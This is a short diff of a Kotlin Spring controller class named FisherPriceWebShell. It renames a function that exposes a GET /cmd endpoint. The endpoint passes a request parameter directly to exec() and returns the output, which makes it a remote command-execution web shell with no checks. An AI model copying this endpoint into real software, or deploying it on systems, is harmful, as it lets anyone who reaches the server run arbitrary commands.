@@ -11,7 +11,7 @@ import java.io.InputStreamReader
 class FisherPriceWebShell() {
 
     @GetMapping("/cmd")
-    fun helloEcs(@RequestParam(value = "cmd", defaultValue = "pwd") name: String): String {
+    fun executeCommand(@RequestParam(value = "cmd", defaultValue = "pwd") name: String): String {
         return exec(name)
     }
 
